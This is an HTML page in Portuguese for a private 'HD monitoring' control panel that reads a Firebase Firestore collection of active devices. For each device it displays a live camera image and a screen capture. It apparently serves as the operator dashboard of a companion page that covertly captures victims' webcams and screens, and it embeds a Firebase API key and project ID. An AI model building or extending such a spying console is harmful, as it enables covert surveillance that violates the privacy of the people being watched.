<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Painel de Controle HD - Privado</title>
    <style>
        body { background: #050505; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; }
        .header { border-bottom: 2px solid #1a73e8; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px; }
        .card { background: #111; border: 1px solid #333; border-radius: 10px; padding: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        .card.online { border-color: #00ff00; }
        .status { font-size: 12px; text-transform: uppercase; font-weight: bold; margin-bottom: 10px; }
        .online-text { color: #00ff00; }
        .offline-text { color: #ff4444; }
        .monitor-box { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
        .screen-container { background: #000; border-radius: 5px; overflow: hidden; position: relative; }
        .screen-container img { width: 100%; height: auto; display: block; min-height: 150px; background: #222; }
        .label { position: absolute; bottom: 5px; left: 5px; background: rgba(0,0,0,0.8); font-size: 10px; padding: 2px 6px; border-radius: 3px; }
    </style>
</head>
<body>

    <div class="header">
        <h1>SISTEMA DE MONITORAMENTO HD</h1>
        <div id="stats">Iniciando...</div>
    </div>

    <div id="grid-dispositivos" class="grid">
        </div>

    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

    <script>
        // Use a MESMA configuração do seu index.html
        const firebaseConfig = {
            apiKey: "AIzaSyBg4iJlgMKbkukddt9bWLfpRXm27u14Zg0",
            projectId: "cameralog-24090",
            appId: "1:1054247726586:web:2e3c0584e54ada96a0c843"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();

        // Escuta o banco de dados em tempo real
        db.collection("ips_ativos").onSnapshot((snapshot) => {
            const grid = document.getElementById('grid-dispositivos');
            document.getElementById('stats').innerText = `Ativos: ${snapshot.size}`;
            grid.innerHTML = "";

            snapshot.forEach((doc) => {
                const data = doc.data();
                const agora = Date.now();
                const ultimaVez = data.last_ping || 0;
                const estaOnline = (agora - ultimaVez) < 15000; // Online se enviou sinal nos últimos 15s

                const card = document.createElement('div');
                card.className = `card ${estaOnline ? 'online' : ''}`;
                
                card.innerHTML = `
                    <div class="status ${estaOnline ? 'online-text' : 'offline-text'}">
                        ● ${estaOnline ? 'Conectado' : 'Desconectado'} - ID: ${doc.id}
                    </div>
                    <div class="monitor-box">
                        <div class="screen-container">
                            <span class="label">CÂMERA</span>
                            <img src="${data.camera || ''}" alt="Camera Feed">
                        </div>
                        <div class="screen-container">
                            <span class="label">TELA</span>
                            <img src="${data.tela || ''}" alt="Screen Feed">
                        </div>
                    </div>
                    <div style="font-size: 10px; color: #666; margin-top: 10px;">
                        Última atualização: ${new Date(ultimaVez).toLocaleTimeString()}
                    </div>
                `;
                grid.appendChild(card);
            });
        });
    </script>
</body>
</html>
